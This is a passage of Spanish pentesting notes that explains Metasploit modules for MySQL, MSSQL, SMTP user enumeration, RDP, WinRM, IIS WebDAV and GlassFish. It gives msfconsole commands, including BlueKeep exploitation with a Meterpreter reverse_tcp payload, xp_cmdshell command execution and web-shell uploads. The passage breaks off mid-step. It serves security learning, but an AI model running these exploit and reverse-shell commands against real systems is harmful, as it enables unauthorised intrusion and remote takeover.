					    - **`RHOSTS`**: La dirección IP del servidor MySQL objetivo.
					    - **`RPORT`**: El puerto del servidor MySQL (por defecto, el puerto es 3306).
					    - **`USERNAME`**: Nombre de usuario de MySQL con permisos para acceder al esquema.
					    - **`PASSWORD`**: Contraseña del usuario de MySQL.
					    - **`DBNAME`**: Especifica una base de datos específica para volcar su esquema. Si no se especifica, se volcará el esquema de todas las bases de datos accesibles.
		- **Modulo para obtener informacion sobre una bd:**
			- El módulo `mysql_enum` de Metasploit es un módulo auxiliar diseñado para enumerar información sobre una base de datos MySQL o MariaDB. Este módulo permite a un atacante o a un pentester recopilar detalles importantes sobre la base de datos que podrían ser útiles para planificar ataques adicionales o para obtener un mayor entendimiento del entorno de la base de datos.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `mysql_enum`
					- **Tipo de módulo:** Auxiliar (no es un exploit)
					- **Función principal:** Enumerar información detallada sobre una instancia de MySQL o MariaDB.
				- ### Funcionalidades del Módulo
	
					1. **Versiones del Servidor y Cliente MySQL:**
					    
					    - Obtiene la versión del servidor MySQL y la versión del cliente MySQL.
					    - Esto es útil para identificar posibles vulnerabilidades que podrían explotarse basadas en la versión del software.
					2. **Variables y Configuraciones del Sistema:**
					    
					    - Enumera variables del sistema MySQL, que pueden proporcionar información sobre la configuración y el comportamiento de la base de datos.
					3. **Usuarios de la Base de Datos:**
					    
					    - Recupera una lista de los usuarios de la base de datos MySQL, incluyendo los hosts desde los que se permite el acceso.
					    - Esto puede ayudar a identificar cuentas con permisos débiles o configuraciones inseguras.
					4. **Bases de Datos y Tablas:**
					    
					    - Enumera las bases de datos disponibles en el servidor y sus tablas.
					    - Saber qué bases de datos y tablas existen es fundamental para planificar ataques más específicos, como inyecciones SQL o acceso no autorizado a datos.
					5. **Grants (Privilegios):**
					    
					    - Recupera información sobre los privilegios (grants) otorgados a los usuarios.
					    - Esto permite evaluar qué usuarios tienen acceso a qué partes de la base de datos y qué operaciones pueden realizar.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo `mysql_enum`:
					    
					    `use auxiliary/scanner/mysql/mysql_enum`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para conectarte a la base de datos MySQL. Algunas opciones clave incluyen:
					    
					    - **`RHOSTS`**: La dirección IP del servidor MySQL.
					    - **`RPORT`**: El puerto en el que el servidor MySQL está escuchando (por defecto, 3306).
					    - **`USERNAME`**: El nombre de usuario con el que intentas conectarte a la base de datos.
					    - **`PASSWORD`**: La contraseña asociada con el usuario.
					    - **`DATABASE`**: (Opcional) El nombre de una base de datos específica que deseas enumerar.
					    
					    Ejemplo:
					    
					    `set RHOSTS 192.168.1.100 set RPORT 3306 set USERNAME root set PASSWORD mypassword`
					    
					3. **Ejecutar el Módulo:**
					    
					    Una vez configuradas las opciones, ejecuta el módulo:
					    				    
					    `run`
					    
					    El módulo intentará conectarse al servidor MySQL con las credenciales proporcionadas y comenzará a enumerar la información.
					    
					4. **Revisar los Resultados:**
					    
					    Los resultados incluirán detalles sobre las versiones, usuarios, bases de datos, tablas y privilegios del servidor MySQL. Esta información será desplegada en la consola de Metasploit.
	- ## MSSQL:
		- **Modulo para fuerza bruta sobre el login:**
			- El módulo `mssql_login` de Metasploit es un auxiliar diseñado para realizar pruebas de autenticación en servidores Microsoft SQL Server. Este módulo es útil para auditar la seguridad de los servidores SQL Server al verificar si las credenciales proporcionadas son válidas para acceder a la base de datos.
				- ### Funcionalidad del Módulo `mssql_login`
	
					1. **Prueba de Credenciales:** Intenta autenticar a un servidor Microsoft SQL Server utilizando una lista de combinaciones de nombre de usuario y contraseña. Si una combinación es válida, el módulo confirma el acceso.
					    
					2. **Escaneo de Servidores:** Puede ser utilizado para escanear un rango de direcciones IP y probar las credenciales en cada servidor SQL Server encontrado.
					    
					3. **Listado de Resultados:** Proporciona información sobre qué combinaciones de credenciales son correctas y si hay algún problema con el servidor SQL (por ejemplo, si el servidor está inalcanzable o si las credenciales son incorrectas).
				```
				use auxiliary/scanner/mssql/mssql_login
				```
		- **Modulo para enumerar informacion de ms:**
			- El módulo `mssql_enum` de Metasploit es una herramienta diseñada para la enumeración de información en servidores Microsoft SQL Server. Su propósito principal es recopilar detalles sobre las bases de datos, tablas, usuarios y otros objetos en un servidor SQL Server. Este módulo puede ser muy útil durante una evaluación de seguridad para obtener información sobre la estructura y configuración del servidor de base de datos.
	
				- ### Funcionalidad del Módulo `mssql_enum`
					
					1. **Enumerar Bases de Datos:** Obtiene una lista de todas las bases de datos disponibles en el servidor SQL Server.
					    
					2. **Enumerar Tablas:** Dentro de cada base de datos, el módulo puede listar todas las tablas existentes.
					    
					3. **Enumerar Columnas:** Para cada tabla, el módulo puede enumerar las columnas y sus tipos de datos.
					    
					4. **Enumerar Usuarios:** Obtiene una lista de usuarios y roles en el servidor SQL Server.
					    
					5. **Enumerar Procedimientos Almacenados:** Identifica los procedimientos almacenados disponibles en el servidor.
					    
					6. **Enumerar Otros Objetos:** Puede también enumerar otros objetos en la base de datos, como vistas y funciones.
				```
				use auxiliary/scanner/mssql/mssql_enum
				```
		- **Modulo para enumerar logins de sql:**
			- El módulo `mssql_enum_sql_logins` de Metasploit es una herramienta diseñada para enumerar las cuentas de inicio de sesión de SQL en un servidor Microsoft SQL Server. Este módulo es útil para los testers de seguridad y administradores para identificar todas las cuentas de usuario SQL en el servidor, lo que puede ser crucial para evaluar la seguridad y la configuración del servidor.
				- ### Funcionalidad del Módulo `mssql_enum_sql_logins`
					1. **Enumeración de Cuentas de Inicio de Sesión SQL:** El módulo se conecta al servidor SQL Server y enumera todas las cuentas de inicio de sesión que están configuradas en el servidor. Esto incluye tanto cuentas de usuario SQL como cuentas de dominio si el servidor está configurado para usar la autenticación integrada de Windows.
					2. **Recopilación de Información sobre Cuentas:** Proporciona detalles sobre cada cuenta, como el nombre de inicio de sesión, el tipo de cuenta, y el estado de la cuenta (habilitada o deshabilitada).
					3. **Exploración de Información Sensible:** Puede ayudar a identificar cuentas de usuario que podrían estar mal configuradas o desactualizadas, lo que podría representar un riesgo de seguridad.
				```
				use auxiliary/admin/mssql/mssql_enum_sql_logins
				```
		- **Modulo de para ejecutar comando en MSSql:**
			- El módulo `mssql_exec` de Metasploit es una herramienta de explotación utilizada para ejecutar comandos arbitrarios en un servidor Microsoft SQL Server mediante la ejecución de comandos SQL. Este módulo puede ser útil tanto para pruebas de penetración como para auditorías de seguridad, ya que permite a un atacante ejecutar comandos del sistema operativo en el servidor objetivo si tiene los permisos adecuados.
	
				- ### Funcionalidad del Módulo `mssql_exec`
					1. **Conexión al Servidor SQL Server:** El módulo se conecta al servidor SQL Server especificado utilizando las credenciales proporcionadas.
					2. **Ejecución de Comandos Arbitrarios:** Permite ejecutar comandos del sistema operativo mediante la ejecución de consultas SQL. La capacidad para ejecutar comandos del sistema operativo generalmente depende de las configuraciones de seguridad del servidor SQL Server y de los permisos del usuario con el que se conecte el módulo.
					3. **Uso de Procedimientos Almacenados:** Utiliza procedimientos almacenados, como `xp_cmdshell`, que están diseñados para ejecutar comandos del sistema operativo desde SQL Server.
				```
				use exploit/windows/mssql/mssql_exec
				```
		- **Modulo para enumerar dominios en MS:**
			- El módulo `mssql_enum_domain` de Metasploit es una herramienta para la enumeración de dominios en servidores Microsoft SQL Server. Está diseñado para obtener información sobre los dominios asociados con el servidor SQL y las cuentas de usuario dentro de esos dominios. Esto puede ser útil en pruebas de penetración para recopilar información que podría facilitar el compromiso de un sistema o para obtener una mejor comprensión del entorno en el que se está trabajando.
				- ### Funcionalidad del Módulo `mssql_enum_domain`
	
					1. **Conexión al Servidor SQL:** Se conecta al servidor SQL Server utilizando las credenciales proporcionadas.
					2. **Enumeración de Dominios:** Obtiene información sobre los dominios asociados con el servidor SQL, incluyendo detalles sobre las cuentas de usuario y los grupos de dominio.
					3. **Recopilación de Información:** El módulo puede extraer y listar cuentas de usuario y grupos, proporcionando una visión general de los recursos del dominio accesibles desde el servidor SQL.
				```
				use auxiliary/gather/mssql_enum_domain
				```
	- ## SMTP:
		- **Modulo para descubrir version:**
			- El módulo `smtp_version` de Metasploit es un módulo auxiliar utilizado para obtener la información de versión del servidor SMTP (Simple Mail Transfer Protocol). Este tipo de módulo se denomina generalmente como "banner grabbing" y se utiliza para identificar el software y la versión que está ejecutando un servicio en un puerto específico.
			- ### Descripción del Módulo
	
				- **Nombre del módulo:** `smtp_version`
				- **Tipo de módulo:** Auxiliar (Scanner)
				- **Función principal:** Identificar la versión del servidor SMTP.
				- **Servicio objetivo:** SMTP (usualmente en el puerto 25, pero puede ser en otros puertos también).
			- ### Funcionalidad del Módulo
	
				- El módulo `smtp_version` se conecta al servidor SMTP en el puerto especificado (por defecto, el puerto 25) y envía un saludo inicial que es parte de la interacción típica del protocolo SMTP. El servidor SMTP responde con un "banner" que suele incluir información sobre el software que está ejecutando y su versión.
	
			- ### Uso Típico del Módulo `smtp_version`
	
				 1 . **Identificación de la Versión:**
					- El objetivo principal de este módulo es identificar el software y la versión del servidor SMTP. Esta información puede ser útil en un análisis de seguridad, ya que saber qué versión de un software se está ejecutando puede ayudar a identificar vulnerabilidades conocidas asociadas con esa versión.
	
				 2 . **Reconocimiento de la Red:**
					- En una fase de reconocimiento o escaneo de red, este módulo puede ser utilizado para mapear qué servicios de correo electrónico están operativos en una red y qué software están utilizando.
	
			- ### Ejecución del Módulo en Metasploit
				1. **Seleccionar el Módulo:**
				    
				    Primero, selecciona el módulo en Metasploit:
	   
				    `use auxiliary/scanner/smtp/smtp_version`
				    
				2. **Configurar las Opciones:**
				    
				    Configura las opciones necesarias para el escaneo. Algunas opciones comunes incluyen:
				    
				    - **`RHOSTS`**: La dirección IP del servidor objetivo o un rango de direcciones IP.
				    - **`RPORT`**: El puerto en el que está escuchando el servicio SMTP (por defecto, 25).
				    - **`THREADS`**: El número de hilos de ejecución para realizar el escaneo en paralelo en múltiples hosts.
		- **Modulo para enumerar recursos:**
			- El módulo `smtp_enum` de Metasploit es un módulo auxiliar utilizado para enumerar usuarios en un servidor de correo electrónico que soporta el protocolo SMTP (Simple Mail Transfer Protocol). La enumeración de usuarios a través de SMTP puede proporcionar información valiosa sobre las cuentas de correo existentes en un dominio, lo que puede ser utilizado en fases posteriores de un ataque, como phishing o ataques de fuerza bruta de contraseñas.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `smtp_enum`
					- **Tipo de módulo:** Auxiliar (no es un exploit)
					- **Función principal:** Enumeración de usuarios en un servidor SMTP.
					- **Protocolos utilizados:** SMTP (puerto 25, 587, o 465).
				- ### Funcionamiento del Módulo
	
					- El módulo `smtp_enum` aprovecha ciertas características del protocolo SMTP para verificar la existencia de direcciones de correo electrónico en un dominio. Esto se hace típicamente utilizando comandos SMTP como `VRFY`, `EXPN` o probando directamente la entrega de correos.
					
					1. **Comando `VRFY`:**
					    
					    - El comando `VRFY` (verify) solicita al servidor SMTP que verifique si una dirección de correo electrónico existe.
					    - Ejemplo: `VRFY user@example.com`.
					    - Si el servidor responde con una confirmación positiva, significa que la dirección de correo existe.
					2. **Comando `EXPN`:**
					    
					    - El comando `EXPN` (expand) puede ser utilizado para expandir una lista de distribución o verificar si un alias corresponde a una dirección de correo real.
					    - Ejemplo: `EXPN list@example.com`.
					    - Esto es útil para descubrir todos los miembros de una lista de distribución.
					3. **Prueba de entrega de correo (RCPT TO):**
					    
					    - Algunos servidores permiten enviar un correo electrónico falso hasta la etapa de `RCPT TO`, donde se especifica el destinatario. Si el servidor acepta el destinatario, indica que la dirección es válida.
					    - Ejemplo: `RCPT TO:<user@example.com>`.
	
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					    			    
					    `use auxiliary/scanner/smtp/smtp_enum`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para realizar la enumeración. Algunas opciones importantes incluyen:
					    
					    - **`RHOSTS`**: La dirección IP del servidor SMTP objetivo.
					    - **`RPORT`**: El puerto en el que está escuchando el servidor SMTP (por defecto, 25).
					    - **`USER_FILE`**: La ruta a un archivo que contiene una lista de nombres de usuarios o direcciones de correo electrónico a probar.
					    - **`METHOD`**: El método de enumeración a utilizar (`VRFY`, `EXPN`, o `RCPT`).
					    
					    Ejemplo:
					    				    
					    `set RHOSTS 192.168.1.100 set RPORT 25 set USER_FILE /path/to/usernames.txt set METHOD VRFY`
					    
					3. **Ejecutar el Módulo:**
					    
					    Una vez configuradas las opciones, ejecuta el módulo:
					
					    `run`
					    
					    El módulo intentará enumerar las direcciones de correo electrónico existentes en el servidor SMTP utilizando el método especificado.
					    
					4. **Revisar los Resultados:**
					    
					    El módulo te mostrará los usuarios o direcciones de correo electrónico que han sido verificadas como existentes en el servidor.
					    
					    Ejemplo de salida:
					       
					    `[+] 192.168.1.100:25 - 'user@example.com' exists`
	- ## RDP
		- **Modulo para explotar blue keeper**
			-  El módulo **`cve_2019_0708_bluekeep`** de **Metasploit** explota la vulnerabilidad conocida como **BlueKeep** (CVE-2019-0708), que afecta a versiones no parcheadas del servicio **Remote Desktop Protocol (RDP)** en varios sistemas operativos Windows. Esta vulnerabilidad es crítica y permite la ejecución remota de código, similar a EternalBlue (MS17-010), sin necesidad de autenticación, y afecta a versiones antiguas de Windows como Windows 7, Windows Server 2008 y Windows Server 2008 R2.
				- ### Contexto de CVE-2019-0708 (BlueKeep):
					
					- **CVE-2019-0708** es una vulnerabilidad en el protocolo RDP (Remote Desktop Protocol) que afecta a versiones no soportadas de Windows (Windows XP, Windows 7, Windows Server 2003, Windows Server 2008). La vulnerabilidad fue publicada en mayo de 2019 y fue considerada crítica debido a la posibilidad de explotación sin interacción del usuario.
					- Esta vulnerabilidad permite que un atacante no autenticado ejecute código malicioso en un sistema afectado, logrando control total del equipo (ejecución de código en modo kernel).
				- ### Función del Módulo de Metasploit:

					- El módulo **`cve_2019_0708_bluekeep`** de Metasploit permite aprovechar esta vulnerabilidad en sistemas vulnerables. Este módulo explota el desbordamiento de memoria (heap) en el servicio RDP, generando una ejecución remota de código (RCE). A través de este exploit, un atacante puede tomar control completo del sistema afectado.
				- ### Cómo funciona el módulo:
					
					1. **Explotación de la vulnerabilidad en RDP**: El módulo utiliza una secuencia específica de mensajes de RDP para aprovechar el fallo en la gestión de memoria del servicio RDP, lo que permite sobrescribir partes de la memoria y ejecutar código arbitrario.
					    
					2. **Comprobación del sistema objetivo**: Antes de explotar el sistema, el módulo puede hacer una verificación para ver si el sistema es vulnerable (ya que los sistemas modernos y los que tienen los parches aplicados no serán explotables).
					    
					3. **Ejecución del payload**: Si el sistema es vulnerable, el módulo inyecta el **payload** (código malicioso) que puede ser configurado para realizar diferentes acciones, como obtener una sesión remota de Meterpreter o ejecutar comandos arbitrarios.
				- ### Ejecución del Módulo en Metasploit:
					
					1. **Cargar el módulo en Metasploit**:
					    
					    Primero, necesitas iniciar Metasploit y cargar el módulo. El comando sería:
					    				    
					    `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
					    
					2. **Configurar los parámetros necesarios**:
					    
					    Se deben configurar algunos parámetros antes de ejecutar el exploit:
					    
					    - **RHOSTS**: El objetivo (dirección IP del sistema vulnerable).
					        
					    - **RPORT**: El puerto de RDP (por defecto es 3389).
					        
					    - **PAYLOAD**: Definir qué tipo de código malicioso deseas ejecutar en el sistema objetivo. Por ejemplo:
					        					        
					        `set PAYLOAD windows/x64/meterpreter/reverse_tcp set RHOSTS <dirección IP objetivo> set LHOST <dirección IP de tu máquina atacante>`
					        
					3. **Ejecutar el exploit**:
					    
					    Una vez configurados los parámetros, puedes ejecutar el módulo usando el comando:
					    
					    `exploit`
					    
					4. **Obtener una sesión**: Si el ataque es exitoso, se establecerá una sesión de **Meterpreter** (o el payload configurado) con el sistema afectado, brindando control remoto completo.
		- **Modulo para escanear host
			- El módulo **rdp_scanner** de Metasploit es una herramienta de escaneo diseñada para detectar hosts que tienen el **Protocolo de Escritorio Remoto (RDP)** habilitado. RDP es un protocolo de comunicación usado en sistemas Windows que permite a los usuarios conectarse de forma remota a otras máquinas a través de una interfaz gráfica. Este módulo no es un exploit, sino un escáner que se utiliza para identificar sistemas que están expuestos mediante RDP, lo cual es útil en pruebas de penetración para detectar posibles vectores de ataque.
			- ### Objetivo del Módulo rdp_scanner

				- El propósito principal de **rdp_scanner** es:

					1. **Identificar hosts con RDP habilitado**: Escanea una lista de direcciones IP o un rango de red para encontrar máquinas con el puerto 3389 abierto, que es el puerto predeterminado para RDP.
					2. **Determinar la versión del protocolo**: A veces puede ofrecer información sobre la versión de RDP que está ejecutando el sistema, lo cual ayuda a identificar si el sistema es vulnerable a exploits conocidos, como el famoso **BlueKeep (CVE-2019-0708)**, una vulnerabilidad crítica en versiones antiguas de RDP.
			- ### Usos Comunes en Seguridad y Pruebas de Penetración

				- En un entorno de seguridad o pruebas de penetración, el escáner RDP de Metasploit es útil para:
					
					- **Reconocimiento**: Detectar máquinas con RDP habilitado es un paso importante en la fase de reconocimiento. Si se encuentran sistemas que exponen RDP en una red, pueden ser objetivos de futuros ataques.
					- **Identificación de posibles vulnerabilidades**: Conocer qué máquinas tienen RDP activo y saber si tienen configuraciones inseguras o sin parches permite al probador de penetración evaluar si existen vulnerabilidades explotables, como BlueKeep.
					- **Evaluación de configuraciones de seguridad**: Determinar si RDP está habilitado en máquinas donde no debería estarlo o si se está usando en redes públicas sin las configuraciones de seguridad adecuadas.
			- ### Cómo Usar el Módulo rdp_scanner en Metasploit

				- Para usar **rdp_scanner** en Metasploit, sigue estos pasos:
					
					1. **Abrir Metasploit**: Ejecuta `msfconsole` en tu terminal para abrir la consola de Metasploit.
					    
					2. **Seleccionar el Módulo rdp_scanner**:
					    					    
					    `use auxiliary/scanner/rdp/rdp_scanner`
					    
					3. **Configurar las Opciones**: Configura las opciones requeridas para el escaneo, como el rango de IP o la dirección IP de destino.
					    
					    `set RHOSTS 192.168.1.0/24`
					    
					    `RHOSTS` permite definir una IP específica o un rango de IPs en una subred.
					    
					4. **Ejecutar el Escaneo**: Una vez configurado, ejecuta el módulo:
					    
					    `run`
					    
					    Esto iniciará el escaneo en el rango de IP especificado y mostrará si hay hosts con el puerto 3389 abierto.
					    

			- ### Salida del Módulo

				- La salida del **rdp_scanner** mostrará:
					
					- La lista de direcciones IP que tienen el puerto 3389 abierto.
					- Información adicional sobre el protocolo, si está disponible.
	- ## RCE:
		- El módulo **cve_2019_0708_bluekeep_rce** de Metasploit es un exploit diseñado para aprovechar la vulnerabilidad **BlueKeep** (CVE-2019-0708) en el Protocolo de Escritorio Remoto (RDP) en sistemas Windows. Esta vulnerabilidad, descubierta en 2019, es crítica porque permite la ejecución remota de código sin autenticación en sistemas vulnerables, lo cual significa que un atacante puede tomar control completo de un sistema afectado sin necesidad de credenciales.

		- ### ¿Qué es BlueKeep (CVE-2019-0708)?
			- - **CVE-2019-0708**, conocido como **BlueKeep**, es una vulnerabilidad en el servicio de RDP de versiones antiguas de Windows. BlueKeep es especialmente peligroso porque es una vulnerabilidad pre-autenticación y explotable de forma remota, lo que significa que los atacantes pueden comprometer un sistema sin necesidad de acceso previo o interacción del usuario.
			- **Sistemas afectados**: Windows 7, Windows Server 2008 R2, y Windows Server 2008. Las versiones de Windows más recientes, como Windows 10 y Windows Server 2019, no están afectadas.
			- Microsoft lanzó un parche de seguridad en mayo de 2019 para corregir esta vulnerabilidad, y debido a su severidad, incluso lanzó parches para versiones de Windows que ya no contaban con soporte, como Windows XP y Windows Server 2003.
		- ### Objetivo del Módulo cve_2019_0708_bluekeep_rce

			- El módulo **cve_2019_0708_bluekeep_rce** en Metasploit permite:
				
				1. **Explotar la vulnerabilidad BlueKeep** en sistemas Windows vulnerables.
				2. **Ejecutar código de manera remota** en el sistema objetivo, lo cual permite al atacante realizar acciones como instalar malware, robar información o incluso usar el sistema como punto de entrada para ataques adicionales en la red.
		- ### Uso del Módulo cve_2019_0708_bluekeep_rce en Metasploit

			1. **Abrir Metasploit**: Ejecuta `msfconsole` para abrir la consola de Metasploit.
			    
			2. **Seleccionar el Módulo BlueKeep**: Carga el módulo BlueKeep:
			    		    
			    `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`
			    
			3. **Configurar las Opciones del Módulo**: Debes configurar las opciones requeridas, principalmente la dirección IP del host remoto (RHOST).
			    
			    `set RHOSTS <dirección IP de la máquina vulnerable>`
			    
			    Además, puedes ajustar otros parámetros, como el puerto de RDP (`RPORT`), que por defecto es el **3389**.
			    
			4. **Payload**: Selecciona el payload que deseas utilizar para la ejecución de código remoto. Un ejemplo común es `windows/meterpreter/reverse_tcp`, que te da control remoto mediante una sesión de Meterpreter.
			    
			    `set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <tu dirección IP> set LPORT <puerto para la conexión de retorno>`
			    
			5. **Ejecutar el Exploit**: Finalmente, lanza el exploit ejecutando:
			    
			    `exploit`
			    
			    Si el sistema es vulnerable y el exploit tiene éxito, se abrirá una sesión con el payload seleccionado, permitiéndote controlar el sistema remoto.
	- ## WINRM
		-  **Modulo para ejecutar script de manera remota
			- El módulo `winrm_script_exec` de Metasploit es una herramienta diseñada para ejecutar scripts en sistemas Windows de manera remota a través del protocolo **WinRM (Windows Remote Management)**. Este protocolo permite la administración remota en sistemas Windows y es una vía común para ejecutar comandos y gestionar máquinas Windows desde otra computadora. A continuación, te explico los aspectos clave de este módulo y cómo se usa en escenarios de pentesting.
			- ### Características Principales del Módulo `winrm_script_exec`
				
				1. **Ejecución Remota de Scripts**:
				    
				    - Permite ejecutar scripts en PowerShell en el sistema objetivo de manera remota. Es útil en escenarios donde tienes acceso a credenciales válidas y el sistema tiene WinRM habilitado.
				2. **Uso de Credenciales**:
				    
				    - Requiere credenciales de usuario válidas para el sistema objetivo. Puedes utilizar un nombre de usuario y contraseña o realizar ataques de **Pass-The-Hash** utilizando hashes NTLM.
				3. **Compatibilidad con PowerShell**:
				    
				    - El módulo está diseñado específicamente para ejecutar scripts de PowerShell, aprovechando las capacidades avanzadas de este shell en sistemas Windows para realizar tareas complejas de administración o post-explotación.
				4. **Interacción con Sistemas Protegidos**:
				    
				    - Este módulo permite interactuar con el sistema objetivo sin necesidad de habilitar otros servicios, lo que reduce la posibilidad de detección. Sin embargo, los administradores pueden auditar y rastrear las conexiones WinRM en entornos monitorizados.
			- ### Configuración y Ejecución del Módulo `winrm_script_exec`

				- Para utilizar este módulo en Metasploit, sigue estos pasos básicos:
					
					1. **Cargar el Módulo en Metasploit**: En Metasploit, carga el módulo con el siguiente comando:
					    
					    `use auxiliary/admin/winrm/winrm_script_exec`
					    
					2. **Definir los Parámetros**:
					    
					    - **RHOSTS**: La IP o el rango de IPs del sistema o sistemas objetivo.
					    - **USERNAME**: El nombre de usuario con permisos para acceder a WinRM en el sistema.
					    - **PASSWORD** o **HASH**: La contraseña o el hash NTLM del usuario.
					    - **SCRIPT**: La ruta al script en PowerShell que deseas ejecutar. También puedes ingresar comandos individuales directamente.
					3. **Ejecutar el Módulo**: Una vez configurados los parámetros, ejecuta el módulo con el comando:
					    
					    `run`
					    

			- ### Ejemplo de Configuración

				- Supón que quieres ejecutar un script en un sistema con la IP `192.168.1.10` usando el usuario `admin` y la contraseña `Password123`. La configuración sería algo como:
					```
					use auxiliary/admin/winrm/winrm_script_exec
					set RHOSTS 192.168.1.10 set USERNAME admin
					set PASSWORD Password123
					set SCRIPT 'Get-Process | Out-File C:\temp\processes.txt' 
					run`
					```
				- Este ejemplo ejecuta el comando `Get-Process` en el sistema objetivo y guarda la lista de procesos en el archivo `C:\temp\processes.txt` del equipo remoto.
			- ### Escenarios Comunes de Uso
				
				1. **Post-Explotación**:
				    
				    - En un entorno de pentesting, si ya tienes credenciales y acceso WinRM, puedes usar este módulo para ejecutar comandos de post-explotación, como recopilar información del sistema, listar procesos, o cargar herramientas de post-explotación como **Mimikatz**.
				2. **Automatización de Tareas de Administración**:
				    
				    - Este módulo también es útil en administración remota para realizar tareas programadas en múltiples sistemas, como ejecutar scripts de auditoría o configuraciones específicas de PowerShell en un conjunto de máquinas.
				3. **Pruebas de Seguridad en WinRM**:
				    
				    - En pruebas de seguridad, puedes verificar la robustez de las credenciales y configuraciones de WinRM en los sistemas, especialmente en redes donde este protocolo es usado frecuentemente para administración remota.
	- ## IIS
		- **Modulo para vulnerar servidor WebDAV**
			- El módulo **`iis_webdav_upload_asp`** de **Metasploit** es un exploit diseñado para aprovechar una vulnerabilidad en el servicio **WebDAV** en servidores **IIS (Internet Information Services)** de Microsoft. Este módulo permite cargar archivos maliciosos (como archivos ASP) en el servidor vulnerable si el servicio WebDAV está habilitado y mal configurado, logrando potencialmente la ejecución de comandos remotos.
			- ### Descripción del Módulo `iis_webdav_upload_asp`
				
				1. **WebDAV en IIS**: WebDAV es un protocolo HTTP que permite a los usuarios crear, leer y modificar archivos y directorios en un servidor web remoto. En un servidor IIS, WebDAV permite que los clientes carguen archivos directamente en el servidor.
				    
				2. **Vulnerabilidad**: Si un servidor IIS está configurado incorrectamente y tiene WebDAV habilitado sin restricciones adecuadas, los atacantes pueden explotar esto para cargar archivos maliciosos en el servidor.
				    
				3. **Uso del archivo ASP**: ASP (Active Server Pages) es un lenguaje de scripting que puede ejecutarse en servidores IIS. Al cargar un archivo ASP malicioso, el atacante puede lograr ejecutar comandos en el servidor, lo que otorga acceso remoto al sistema.
			- ### Requisitos y Condiciones Previas
				
				- **Servidor IIS con WebDAV habilitado**: El servidor de destino debe estar ejecutando IIS y tener habilitado WebDAV sin las restricciones adecuadas.
				- **Acceso de escritura**: La configuración de WebDAV debe permitir cargar archivos en el servidor. Esto es común en configuraciones inseguras o mal configuradas.
			- ### Configuración y Uso del Módulo en Metasploit

				1. **Iniciar Metasploit**:
				    
				    bash
				    
				    Copiar código
				    
				    `msfconsole`
				    
				2. **Seleccionar el módulo `iis_webdav_upload_asp`**:
				    
				    bash
				    
				    Copiar código
				    
				    `use exploit/windows/iis/iis_webdav_upload_asp`
				    
				3. **Configurar el objetivo (`RHOSTS`) y el archivo ASP malicioso**:
				    
				    - **`RHOSTS`**: La dirección IP o el nombre de host del servidor IIS vulnerable.
				    - **`RPORT`**: Puerto del servicio WebDAV, que por defecto suele ser el puerto **80** (HTTP) o **443** (HTTPS).
				    - **`LHOST`**: La IP de tu máquina atacante (la IP de callback para la sesión).
				    - **`LPORT`**: Puerto en tu máquina donde quieres recibir la conexión.
				    
				    Ejemplo de configuración:
				    
				    bash
				    
				    Copiar código
				    
				    `set RHOSTS <IP_del_servidor> set RPORT 80 set LHOST <IP_de_la_máquina_atacante> set LPORT 4444`
				    
				4. **Verificar opciones y lanzar el exploit**:
				    
				    bash
				    
				    Copiar código
				    
				    `show options exploit`
				    
				
			- ### Qué Ocurre al Ejecutar el Exploit
				
				- El módulo `iis_webdav_upload_asp` intenta lo siguiente:
				
					- **Carga un archivo ASP malicioso** en el servidor IIS usando WebDAV.
					- **Ejecuta el archivo ASP** cargado para obtener una **sesión remota** (una shell) en el servidor IIS.
				
				- Si el exploit es exitoso, tendrás acceso al sistema de archivos y posiblemente a comandos en el servidor.
	- ## Glassfish:
		- **Exploit para que aprovecha vulnerabilidades:**
			- El módulo `glassfish_deployer` de Metasploit es un exploit que aprovecha una vulnerabilidad en el servicio de despliegue de aplicaciones (Application Deployment) de **GlassFish** y **Oracle WebLogic Server**. Este módulo permite a un atacante remoto desplegar un archivo malicioso (como una _web shell_) en el servidor, lo que les da la capacidad de ejecutar comandos arbitrarios con los privilegios del servidor.
				- ### Descripción del Módulo
					
					- **Nombre del módulo:** `glassfish_deployer`
					- **Tipo de módulo:** Exploit
					- **Plataforma objetivo:** GlassFish, Oracle WebLogic Server
					- **Método de explotación:** Despliegue de aplicaciones maliciosas a través de la consola de administración de GlassFish o WebLogic.
				- ### Funcionamiento del Módulo
					
					1. **Vulnerabilidad Explotada:**
					    
					    - El módulo explota la funcionalidad de despliegue de aplicaciones en GlassFish o WebLogic.
					    - Si el servicio de despliegue está habilitado y accesible sin autenticación o con credenciales débiles, un atacante puede subir y desplegar aplicaciones arbitrarias.
					2. **Payload:**
					    
					    - El atacante utiliza el módulo para cargar un archivo WAR (Web Application Archive), que es un archivo empaquetado que contiene una aplicación web (incluyendo código malicioso).
					    - Una vez desplegado, el archivo WAR permite al atacante ejecutar comandos en el sistema operativo subyacente, obteniendo control del servidor.
					3. **Requerimientos:**
					    
					    - El servidor GlassFish o WebLogic debe tener la consola de administración accesible desde la red.
					    - El módulo requiere que el atacante conozca las credenciales de administrador o que el servidor esté mal configurado para permitir el despliegue sin autenticación.
				- ### Ejecución del Módulo en Metasploit
	
					1. **Seleccionar el Módulo:**
					    
					    Primero, selecciona el módulo en Metasploit:
					      
					    `use exploit/multi/http/glassfish_deployer`
					    
					2. **Configurar las Opciones:**
					    
					    Configura las opciones necesarias para el ataque. Algunas opciones importantes incluyen:
					    
					    - **`RHOSTS`**: La dirección IP del servidor GlassFish o WebLogic objetivo.
					    - **`RPORT`**: El puerto en el que el servicio está escuchando (por defecto, suele ser 8080 o 4848 para GlassFish).
					    - **`USERNAME`** y **`PASSWORD`**: Las credenciales de administrador si se requieren. Si el servidor permite despliegues sin autenticación, estos no son necesarios.
					    - **`TARGETURI`**: La ruta de la consola de administración, por defecto `/manager/html` o `/admin`.
					    
					    Ejemplo de configuración:
					    				    
					    `set RHOSTS 192.168.1.10 set RPORT 4848 set USERNAME admin set PASSWORD admin123 set TARGETURI /manager`
					    
					3. **Seleccionar un Payload:**
					    
					    Escoge un payload que será desplegado como parte de la aplicación maliciosa. Un payload típico podría ser una _web shell_ que te permita ejecutar comandos en el servidor:
					    				    
